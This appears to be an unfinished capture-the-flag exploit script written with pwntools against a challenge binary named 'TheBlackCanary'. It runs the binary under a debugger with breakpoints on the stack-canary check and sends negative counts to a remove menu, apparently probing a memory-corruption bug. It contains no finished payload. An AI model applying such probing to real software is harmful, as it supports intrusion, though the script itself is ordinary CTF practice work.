#!/usr/bin/env python
from pwn import *

#context.log_level = 'debug'
#conn = remote("nc chal.noxale.com", 6667)

#conn = process("TheBlackCanary")

conn = process(["gdb-peda","TheBlackCanary"])
conn.sendline("break __stack_chk_fail")
conn.sendline("break *0x0401286")
conn.sendline("r")

def Print():
	conn.recvuntil("5. Let the world die")
	conn.sendline("1")
	
def Add(argument):
	conn.recvuntil("5. Let the world die")
	conn.sendline("2")
	conn.recvuntil("Enter your argument:")
	conn.sendline(argument)

def Edit(idx, argument):
	conn.recvuntil("5. Let the world die")
	conn.sendline("3")
	conn.recvuntil("Which argument would you like to edit?")
	conn.sendline(str(idx))
	conn.recvuntil("Enter your new argument:")
	conn.sendline(argument)

def Remove(select, idx, num,argument):
	conn.recvuntil("5. Let the world die")
	conn.sendline("4")
	conn.recvuntil("What would you like to do?")
	conn.sendline(str(select))
	conn.recvuntil("?")
	conn.sendline(str(idx))
	if select==2:
		conn.recvuntil("?")
		conn.sendline(str(num))
"""
for i in range(10):
	Add("a"*31)
"""

Add("a")
Remove(2,0,-1,"")
Remove(2,0,-10,"")

conn.interactive()


